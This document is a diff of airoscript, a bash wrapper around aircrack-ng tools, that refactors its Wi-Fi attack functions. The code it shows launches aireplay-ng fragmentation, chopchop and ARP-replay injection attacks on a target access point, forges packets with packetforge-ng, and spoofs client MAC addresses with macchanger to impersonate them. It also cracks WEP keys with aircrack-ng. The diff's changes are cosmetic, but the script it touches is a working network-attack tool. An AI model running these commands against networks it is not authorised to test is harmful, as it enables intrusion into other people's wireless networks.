@@ -447,18 +447,14 @@ function witchattack {
 
 		#Option 3 (fragmentation attack)
 		function fragnoclient {
-			rm -rf fragment-*.xor
-			rm -rf $DUMP_PATH/frag_*.cap
-			rm -rf $DUMP_PATH/$Host_MAC*
+			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
 			killall -9 airodump-ng aireplay-ng # FIXME Is this a good idea? I think we should save pids of what we launched, and then kill them.
 		$CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG  "`gettext  \"Fragmentation attack on $Host_SSID\"` " $EXECFLAG $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture & choosefake &  injectmenu
 			}
 
 		#Option 4 (chopchopattack)
 		function chopchopattack {
-			$clear
-			rm -rf $DUMP_PATH/$Host_MAC*
-			rm -rf replay_dec-*.xor
+			$clear && rm -rf $DUMP_PATH/$Host_MAC* replay_dec-*.xor
 			capture &  fakeauth3 & $CDCMD  $TERMINAL $HOLD $TITLEFLAG  "`gettext 'ChopChoping:'` $Host_SSID " $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $EXECFLAG $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $IWIFI & injectmenu
 		}
 		#Option 5 (caffe late attack)
@@ -473,56 +469,42 @@ function witchattack {
 
 		#Option 7 (Auto arp replay)
 		function attackclient {
-			if [ "$INTERACTIVE" ] # More interactive airoscript.
-			then
+			if [ "$INTERACTIVE" ]; then
 				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
 					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
 				read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT 
 					if [ "$FT" = "" ]; then FT="f"; fi
-			else
-				INJMAC="FF:FF:FF:FF:FF:FF"
-				FT="f"
-			fi
+			else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
 			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Injection:'` `gettext 'Host'` : $Host_MAC `gettext 'Client'` : $Client_MAC" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
 		}
 
 		#Option 8 (interactive arp replay) 
 		function interactiveattack {
-			if [ "$INTERACTIVE" ] # More interactive airoscript.
-			then
+			if [ "$INTERACTIVE" ]; then
 				read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
 					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
 				read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT 
 					if [ "$FT" = "" ]; then FT="0841"; fi
-			else
-				INJMAC="FF:FF:FF:FF:FF:FF"
-				FT="0841"
-			fi
+			else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
 			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Interactive Packet Sel on:'` $Host_SSID" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
 		}
 
 		#Option 9 (fragmentation attack)
 		function fragmentationattack {
-			rm -rf fragment-*.xor
-			rm -rf $DUMP_PATH/frag_*.cap
-			rm -rf $DUMP_PATH/$Host_MAC*
+			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
 			killall -9 airodump-ng aireplay-ng
 			$CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext \"Fragmentation attack on $Host_SSID\"`" $EXECFLAG $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture &  injectmenu
 		}
 
 		#Option 10 (fragmentation attack with client)
 		function fragmentationattackclient {
-			rm -rf fragment-*.xor
-			rm -rf $DUMP_PATH/frag_*.cap
-			rm -rf $DUMP_PATH/$Host_MAC*
+			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
 			killall -9 airodump-ng aireplay-ng
 			$CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext \"Fragmentation attack on $Host_SSID\"`" $EXECFLAG $AIREPLAY -7 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture &  injectmenu
 		}
 		#Option 11
 		function chopchopattackclient {
-			$clear
-			rm -rf $DUMP_PATH/$Host_MAC*
-			rm -rf replay_dec-*.xor
+			$clear && rm -rf $DUMP_PATH/$Host_MAC* replay_dec-*.xor
 			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'ChopChoping: $Host_SSID'`" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $EXECFLAG $AIREPLAY --chopchop -h $Client_MAC $IWIFI & injectmenu
 		}
 		#Option 12 (pskarp)
@@ -535,20 +517,16 @@ function witchattack {
 
 	# If wpa
 	function wpahandshake {
-		$clear
-		rm -rf $DUMP_PATH/$Host_MAC*
+		$clear && rm -rf $DUMP_PATH/$Host_MAC*
 		$CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Capturing data on channel:'` $Host_CHAN" $TOPLEFTBIG $BGC "$BACKGROUND_COLOR" $FGC "$DUMPING_COLOR" $EXECFLAG $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
 	}
 
 	function attackopn { # If no encryption detected
-	  if [ "$Host_SSID" = "" ] 
-	  then
-		 $clear
-	 	 echo  "`gettext 'ERROR: You have to select a target'`"
+	  if [ "$Host_SSID" = "" ]; then
+		 $clear &&  echo  "`gettext 'ERROR: You have to select a target'`"
 	  else
-		$clear
-			echo `gettext "ERROR: Network not encrypted or no network selected "`
-			fi
+		$clear && echo `gettext "ERROR: Network not encrypted or no network selected "`
+	  fi
 	}
 
 
@@ -895,141 +873,24 @@ Option: '`"
 			read yn
 			
 			case $yn in
-				1 ) fakemacchanger ;$clear; break ;;
-				2 ) macchanger ;$clear; break ;;
-				3 ) macinput ; $clear; break ;;
+				1 )	ifconfig $WIFICARD down
+				    $MACCHANGER -m  $FAKE_MAC $WIFICARD
+				    ifconfig $WIFICARD up; $clear; break ;;
+				2 ) ifconfig $WIFICARD down; sleep 2
+				    $MACCHANGER -m  $Client_MAC $WIFICARD
+				    ifconfig $WIFICARD up ;$clear; break ;;
+				3 ) read -p "MAC: " Manual_MAC
+					ifconfig $WIFICARD down
+					$MACCHANGER -m  $Manual_MAC $WIFICARD
+					ifconfig $WIFICARD up; $clear; break ;;
 				* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
 			esac
 		done 
-	}	
-		# And those are from wichchangemac
-		function fakemacchanger {
-			if [ "$TYPE" = "RalinkUSB" ]
-			then
-				fakechangemacrausb
-			elif [ "$TYPE" = "Ralinkb/g" ]
-			then
-				fakechangemacwlan
-			elif [ "$DRIVER" = "PCI" ]
-			then
-				fakechangemacwlan
-			elif [ "$TYPE" = "Atherosmadwifi-ng" ]
-			then
-				fakechangemacath
-			else
-			echo -e "`gettext \"Unknow way to change mac\"`"
-			fi
-		}
-			# And those from fakemacchanger
-			function fakechangemacrausb {
-				ifconfig $WIFICARD down
-				$MACCHANGER -m  $FAKE_MAC $WIFICARD
-				ifconfig $WIFICARD up
-			}
-
-			function fakechangemacwlan {
-				ifconfig $WIFICARD down
-				$MACCHANGER -m  $FAKE_MAC $WIFICARD
-				ifconfig $WIFICARD up
-			}
-
-			function fakechangemacath {
-				ifconfig $WIFICARD down
-				$MACCHANGER -m  $FAKE_MAC $WIFICARD
-				ifconfig $WIFICARD up
-			}
-
-
-
-		function macchanger {
-			if [ "$TYPE" = "RalinkUSB" ]
-			then
-				changemacrausb
-			elif [ "$TYPE" = "Ralinkb/g" ]
-			then 
-				changemacwlan
-			elif [ "$DRIVER" = "PCI" ]
-			then
-				changemacwlan
-			elif [ "$TYPE" = "Atherosmadwifi-ng" ]
-			then
-				changemacath
-			else
-				echo -e "`gettext \"Unknow way to change mac\"`"
-			echo "$DRIVER $TYPE"
-			fi			
-		}
-			# Those are part of macchanger
-			function changemacrausb {
-				ifconfig $WIFICARD down
-				sleep 2
-				$MACCHANGER -m  $Client_MAC $WIFICARD
-				ifconfig $WIFICARD up
-			}
-
-			function changemacwlan {
-				ifconfig $WIFICARD down
-				sleep 2
-				$MACCHANGER -m  $Client_MAC $WIFICARD
-				ifconfig $WIFICARD up
-			}
-
-			function changemacath {
-				ifconfig $WIFICARD down
-				sleep 2
-				$MACCHANGER -m  $Client_MAC $WIFICARD
-				ifconfig $WIFICARD up
-			}
-
-		function macinput {
-			echo -n -e "`gettext \"OK, now type in new MAC: \"`"
-			read MANUAL_MAC
-			echo `gettext 'You typed:'` $MANUAL_MAC
-			set -- ${MANUAL_MAC}
-			manualmacchanger
-		}
-
-			function manualmacchanger {
-				if [ "$TYPE" = "RalinkUSB" ]
-				then
-					manualchangemacrausb
-				elif [ "$TYPE" = "Ralinkb/g" ]
-				then
-					manualchangemacwlan
-				elif [ "$DRIVER" = "PCI" ]
-				then
-					manualchangemacwlan
-				elif [ "$TYPE" = "Atherosmadwifi-ng" ]
-				then
-					manualchangemacath
-				else
-					echo "Unknow way to change mac"
-			echo "$DRIVER $TYPE"
-				fi			
-			}
-			# I suppose all this code if for precaution. I mean, if sometime the method differes between the different kind of cards, or if we've got to add a new card with a differente method. FIXME I don't like it so I'll delete it.
-				function manualchangemacrausb {
-					ifconfig $WIFICARD down
-					$MACCHANGER -m  $Client_MAC $WIFICARD
-					ifconfig $WIFICARD up
-				}
-
-				function manualchangemacwlan {
-					ifconfig $WIFICARD down
-					$MACCHANGER -m  $Client_MAC $WIFICARD
-					ifconfig $WIFICARD up
-				}
-
-				function manualchangemacath {
-					ifconfig $WIFICARD down
-					$MACCHANGER -m  $Client_MAC $WIFICARD
-					ifconfig $WIFICARD up
-				}
+	}
 
 	# 5. 
 		function choosemdk {
-			if [ -x $MDK3 ] 
-			then
+			if [ -x $MDK3 ]; then
 			while true; do
 				$clear
 				echo -n "`gettext '
@@ -1045,7 +906,6 @@ Option: '`"
 			Option: '`"
 
 				read yn
-
 				case $yn in
 					1 ) mdkpain ; break ;;
 					2 ) mdktargetedpain ; break ;;
@@ -1231,17 +1091,17 @@ function injectmenu {
 	$clear
 	while true; do
 		echo -n -e "`gettext '
-_____________________________________
-#   If previous step went fine      #
-#   Select next, otherwise hit5     #
-#                                   #
-#    1) Frag injection              #
-#    2) Frag with client injection  #
-#    3) Chochop injection           #
-#    4) Chopchop with client inj.   #
-#    5) Return to main menu         #
-#                                   #
-#___________________________________#
++-----------------------------------+
+|   If previous step went fine      |
+|   Select next, otherwise hit any  |
+|                                   |
+|    1) Frag injection              |
+|    2) Frag with client injection  |
+|    3) Chochop injection           |
+|    4) Chopchop with client inj.   |
+|    5) Return to main menu         |
+|                                   |
++-----------------------------------+
 Option: '`"	
 		read yn
 		echo ""
@@ -1250,8 +1110,7 @@ Option: '`"
 			2 ) fragmentationattackend ; break ;;
 			3 ) chopchopend ; break ;; 
 			4 ) chopchopclientend ; break ;;
-			5 ) $clear; break ;;
-			* ) echo "Unknown response. Try again" ;;
+			* ) $clear; break;;
 		esac
 	done 
 }
@@ -1260,8 +1119,7 @@ Option: '`"
 	function fragnoclientend {
 		if [ "$Host_MAC" = "" ]
 		then
-			$clear
-			echo `gettext 'ERROR: You must select a target first'`
+			$clear && echo `gettext 'ERROR: You must select a target first'`
 		else
 		$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
 		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext 'Injecting forged packet on'` $Host_SSID" $EXECFLAG $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $IWIFI & menufonction
@@ -1270,24 +1128,19 @@ Option: '`"
 
 	function fragmentationattackend {
 
-		if [ "$Host_MAC" = "" ]
-		then
-			$clear
-			echo `gettext 'ERROR: You must select a target first' `
+		if [ "$Host_MAC" = "" ]; then
+			$clear;	echo `gettext 'ERROR: You must select a target first' `
 		else
-		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
-		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext 'Injecting forged packet on'` $Host_SSID" $EXECFLAG $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $IWIFI & menufonction
+	    	$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
+	    	$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext 'Injecting forged packet on'` $Host_SSID" $EXECFLAG $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $IWIFI & menufonction
 		fi
 	}
 
 	function chopchopend {
-		if [ "$Host_MAC" = "" ]
-		then
-			$clear
-			echo `gettext 'ERROR: You must select a target first' `
+		if [ "$Host_MAC" = "" ]; then
+			$clear && echo `gettext 'ERROR: You must select a target first' `
 		else
 		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
-
 		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
 		$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
 		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Sending chopchop to:'` $Host_SSID" $EXECFLAG $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $IWIFI & menufonction
@@ -1295,10 +1148,8 @@ Option: '`"
 	}
 	
 	function chopchopclientend {
-		if [ "$Host_MAC" = "" ]
-		then
-			$clear
-			echo `gettext 'ERROR: You must select a target first' `
+		if [ "$Host_MAC" = "" ];then
+			$clear && echo `gettext 'ERROR: You must select a target first' `
 		else
 		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
 		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
@@ -1328,14 +1179,7 @@ Option: '`"
 		$clear
 	}
 
-function witchconfigure {
-if [ $Host_ENC = "WEP" ]
-  		then
-		configure
-		else
-		wpaconfigure
-		fi			
-}
+function witchconfigure { if [ $Host_ENC = "WEP" ]; then configure; else wpaconfigure; fi; }
 
 function configure {
 		$AIRCRACK -a 1 -b $Host_MAC -s -0 -z $DUMP_PATH/$Host_MAC-01.cap &> $DUMP_PATH/$Host_MAC.key 
@@ -1351,15 +1195,11 @@ function doauto {
 		choosetype
 
 		# Now the one on wich you select target
-		if [ -e $DUMP_PATH/dump-01.csv ] 	
-		then
+		if [ -e $DUMP_PATH/dump-01.csv ];then
 			Parseforap
 			$clear
-			if [ "$Host_SSID" = $'\r' ]
-	 			then blankssid;
-			elif [ "$Host_SSID" = "No SSID has been detected" ]
-				then blankssid;
-			fi
+			if [ "$Host_SSID" = $'\r' ]; then blankssid;
+			elif [ "$Host_SSID" = "No SSID has been detected" ]; then blankssid; fi
 			target
 			choosetarget
 			$clear
@@ -1439,14 +1279,14 @@ function setinterface {
 }
 
 
-function testmac {
+testmac(){
 	if [ "$TYPE" = "Atherosmadwifi-ng" ]; then
 		FAKE_MAC=`ifconfig $WIFICARD | grep $WIFI | awk '{print $5}' | cut -c -17  | sed -e "s/-/:/" | sed -e "s/\-/:/"  | sed -e "s/\-/:/" | sed -e "s/\-/:/" | sed -e "s/\-/:/"`
 		echo -e "`gettext \"Changed fake_mac : $FAKE_MAC\"`" 
 	fi
 }
 
-function blankssid {
+blankssid(){
 	while true; do
 		$clear
 		echo -e -n "`gettext '
